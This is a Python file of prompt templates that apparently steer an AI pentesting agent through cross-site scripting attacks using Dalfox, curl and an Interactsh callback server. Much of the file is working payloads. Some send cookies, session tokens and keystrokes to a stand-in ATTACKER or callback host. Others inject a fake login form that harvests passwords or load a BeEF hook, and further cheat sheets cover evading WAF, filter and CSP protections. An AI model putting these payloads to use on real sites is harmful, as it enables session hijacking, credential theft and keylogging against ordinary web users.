"""
RedAmon XSS (Cross-Site Scripting) Prompts

Prompts for XSS attack workflows using Dalfox and manual techniques.
Covers reflected, stored, DOM-based, and blind XSS with OOB callbacks via Interactsh.
"""


# =============================================================================
# XSS MAIN WORKFLOW
# =============================================================================

XSS_TOOLS = """
## ATTACK SKILL: CROSS-SITE SCRIPTING (XSS)

**CRITICAL: This attack skill has been CLASSIFIED as XSS.**
**You MUST follow the XSS workflow below. Do NOT switch to other attack methods.**

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
Dalfox workers: {xss_workers}  (concurrent scan threads)
WAF bypass:     {xss_waf_bypass}  (enable WAF evasion techniques)
Deep DOM scan:  {xss_deep_dom}  (enable deep DOM-based XSS analysis)
Max attempts:   {xss_max_attempts}  (max retry attempts per parameter)
Scan timeout:   {xss_timeout}s  (timeout per scan)
```

**Always include in every `kali_shell` dalfox call:** `--silence` (suppress banner)

---

## MANDATORY XSS WORKFLOW

### Step 1: Target Analysis (execute_curl)

Send a baseline request to the target URL and capture the normal response:

1. Use `execute_curl` to make a normal GET/POST request to the target endpoint
2. Identify injectable parameters: query string, POST body, headers, cookies
3. Check response for:
   - Content-Type header (text/html = primary target)
   - CSP headers (Content-Security-Policy) - note restrictions
   - X-XSS-Protection header - check if disabled (0) or enabled
   - Response body - identify where user input is reflected
4. Note the normal response length and structure (needed for blind detection)

**After Step 1, request `transition_phase` to exploitation before proceeding to Step 2.**
This unlocks the full exploitation toolset and ensures findings are tracked correctly.

### Step 2: Quick Dalfox Detection (kali_shell, <120s)

Run an initial Dalfox scan to detect XSS vulnerabilities:

```
kali_shell("dalfox url 'TARGET_URL' --silence --worker {xss_workers} --timeout {xss_timeout}")
```

**For POST requests**, use `--data`:
```
kali_shell("dalfox url 'TARGET_URL' --data 'param1=value1&param2=value2' --silence --worker {xss_workers}")
```

**For specific parameter testing**, use `-p`:
```
kali_shell("dalfox url 'TARGET_URL' -p vulnerable_param --silence --worker {xss_workers}")
```

**For cookie-based injection**, use `--cookie`:
```
kali_shell("dalfox url 'TARGET_URL' --cookie 'session=abc123' --silence --worker {xss_workers}")
```

Parse the output for:
- Confirmed XSS (POC payloads that triggered)
- XSS type (reflected, stored, DOM)
- Parameter names vulnerable
- Whether WAF was detected

### Step 3: WAF Detection & Bypass

If Dalfox reports WAF detection or you get 403/406 responses:

1. **Retry with WAF bypass mode**:
```
kali_shell("dalfox url 'TARGET_URL' --waf-evasion --silence --worker {xss_workers}")
```

2. **Use custom payloads for specific WAFs**:
   - **Generic WAF**: `--custom-payload '<img src=x onerror=alert(1)>'`
   - **ModSecurity**: `--custom-payload '<svg/onload=alert(1)>'`
   - **Cloudflare**: `--custom-payload '<details open ontoggle=alert(1)>'`

3. **Manual bypass via execute_curl** if Dalfox fails entirely:
   - Test with encoding: `%3Cscript%3Ealert(1)%3C/script%3E`
   - Test with unicode: `<script>alert(1)</script>` (unicode quotes)
   - Test case variation: `<ScRiPt>alert(1)</sCrIpT>`
   - Test event handlers: `" onmouseover="alert(1)`

### Step 4: Exploitation (based on detected XSS type)

**Reflected XSS** (immediate trigger):
```
kali_shell("dalfox url 'TARGET_URL' --silence --format json")
```
The output JSON contains the exact POC URL with payload.

**DOM-based XSS** (requires deep analysis):
```
kali_shell("dalfox url 'TARGET_URL' --deep-domxss --silence --worker {xss_workers}")
```

**Stored XSS** (requires two-step):
1. Submit payload to vulnerable form/endpoint
2. Navigate to page where payload renders to trigger

**Blind XSS** (no immediate response):
Follow the **OOB XSS Workflow** section below.

### Step 5: Long Scan Mode (if scan exceeds 120s)

For complex targets (many parameters, heavy WAF), run dalfox in background:

**Start background scan:**
```
kali_shell("dalfox url 'TARGET_URL' --silence --format json > /tmp/dalfox_out.json 2>&1 & echo $!")
```
-> Note the PID from the output.

**Poll progress** (run periodically):
```
kali_shell("tail -50 /tmp/dalfox_out.json")
```

**Check if still running:**
```
kali_shell("ps aux | grep 'dalfox' | grep -v grep")
```

**Read final output when done:**
```
kali_shell("cat /tmp/dalfox_out.json | tail -200")
```

### Step 6: Payload Generation Priority

Generate payloads in this order (most impactful first):

1. **Cookie theft**: `<script>fetch('http://ATTACKER/?c='+document.cookie)</script>`
2. **Session hijacking**: `<script>new Image().src='http://ATTACKER/?s='+localStorage.getItem('token')</script>`
3. **Keylogger**: `<script>document.onkeypress=function(e){{fetch('http://ATTACKER/?k='+e.key)}}</script>`
4. **Phishing overlay**: `<script>document.body.innerHTML='<h1>Session Expired</h1><form action=http://ATTACKER><input name=user><input name=pass type=password><input type=submit></form>'</script>`
5. **BeEF hook**: `<script src="http://ATTACKER:3000/hook.js"></script>`

### Step 7: Evidence Collection

For confirmed XSS vulnerabilities:
1. Capture the exact POC URL/payload
2. Document the XSS type (reflected/stored/DOM/blind)
3. Note the vulnerable parameter
4. Screenshot or save response showing payload execution
5. Assess impact (cookie theft, session hijack, defacement, etc.)
"""


# =============================================================================
# OOB (OUT-OF-BAND) XSS WORKFLOW
# =============================================================================

XSS_OOB_WORKFLOW = """
## OOB XSS Workflow (Blind XSS with Callback Server)

**Use this when:** XSS payload is stored but doesn't immediately render,
or when testing admin panels/internal pages you can't directly access.
Requires `interactsh-client` installed in kali-sandbox.

---

### Setting Up Interactsh Callback Domain

**Step 1: Start interactsh-client as a background process**
```
kali_shell("interactsh-client -server oast.fun -json -v > /tmp/interactsh.log 2>&1 & echo $!")
```
-> **Save the PID** from the output for later cleanup.

**Step 2: Wait and read the registered domain**
```
kali_shell("sleep 5 && head -20 /tmp/interactsh.log")
```
-> Look for a line containing the `.oast.fun` domain (e.g., `abc123xyz.oast.fun`)
-> **IMPORTANT:** This domain is cryptographically registered with the server.
   Random strings will NOT work -- you MUST use the domain from this output.

**Step 3: Use the domain in blind XSS payloads**

**Option A -- Dalfox with OOB (PREFERRED -- handles everything):**
```
kali_shell("dalfox url 'TARGET_URL' --blind REGISTERED_DOMAIN --silence --worker {xss_workers}")
```

**Option B -- Manual blind XSS payloads via execute_curl:**

Basic callback:
```html
<script>new Image().src='http://DOMAIN/xss?cookie='+document.cookie</script>
```

Full exfiltration:
```html
<script>
var data = btoa(document.cookie + '|||' + document.location.href);
new Image().src='http://DOMAIN/'+data;
</script>
```

Event-based (bypasses some filters):
```html
<img src=x onerror="fetch('http://DOMAIN/?d='+document.domain)">
<svg onload="new Image().src='http://DOMAIN/?c='+document.cookie">
<body onpageshow="fetch('http://DOMAIN/?u='+location.href)">
```

Polyglot (works in multiple contexts):
```html
jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcLiCk=fetch('http://DOMAIN') )//
```

**Step 4: Poll for interactions**
```
kali_shell("cat /tmp/interactsh.log | tail -50")
```
-> Look for JSON lines with `"protocol":"http"` or `"protocol":"dns"` containing exfiltrated data
-> Example: `{{"protocol":"http","full-id":"cookie%3Dsession%3Dxyz.abc123xyz.oast.fun"}}` means cookie was exfiltrated

**Step 5: Cleanup when done**
```
kali_shell("kill SAVED_PID")
```
"""


# =============================================================================
# XSS PAYLOAD REFERENCE
# =============================================================================

XSS_PAYLOAD_REFERENCE = """
## XSS Payload Reference

### Basic Payloads (testing detection)
```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### WAF Bypass Encoding Quick Reference
| Technique | Example | Use When |
|-----------|---------|----------|
| HTML entities | `&#60;script&#62;` | `<>` blocked |
| Hex encoding | `\\x3cscript\\x3e` | Keywords blocked |
| Unicode | `\\u003cscript\\u003e` | Keywords blocked |
| Double URL | `%253Cscript%253E` | Single-decode WAF |
| Case mixing | `<ScRiPt>` | Case-sensitive WAF |
| Null byte | `<scri%00pt>` | Null-terminated parsing |
| Comments | `<scr<!--comment-->ipt>` | Simple keyword filters |

### Event Handler Payloads (no `<script>` tags)
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><maction xlink:href="javascript:alert(1)">click</maction></math>
```

### DOM-based XSS Sources & Sinks
**Sources (user input):**
- `location.hash`
- `location.search`
- `document.URL`
- `document.referrer`
- `window.name`
- `postMessage` data

**Sinks (dangerous functions):**
- `eval()`
- `innerHTML`
- `document.write()`
- `setTimeout()` / `setInterval()`
- `location.href`
- `jQuery.html()` / `$().html()`

### Filter Bypass Cheatsheet
```html
' onfocus=alert(1) autofocus='
" onfocus=alert(1) autofocus="
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
</style><script>alert(1)</script>
</script><script>alert(1)</script>
javascript:alert(1)//
data:text/html,<script>alert(1)</script>
```

### CSP Bypass Techniques
- If `script-src 'unsafe-inline'`: Direct `<script>` tags work
- If `script-src` allows CDN: Use JSONP endpoints from allowed CDNs
- If `script-src` allows `'strict-dynamic'`: Inject via existing scripts
- If no CSP or report-only: All payloads work
- Use `<base>` tag to hijack relative script paths
- Use Angular/React/Vue template injection if allowed

### Context-Specific Payloads
**Inside HTML tag attribute:**
```html
" onclick=alert(1) x="
' onclick=alert(1) x='
" autofocus onfocus=alert(1) x="
```

**Inside JavaScript string:**
```javascript
'-alert(1)-'
';alert(1)//
\\';alert(1)//
</script><script>alert(1)</script>
```

**Inside JavaScript template literal:**
```javascript
${{alert(1)}}
`-alert(1)-`
```

**Inside URL attribute:**
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```
"""
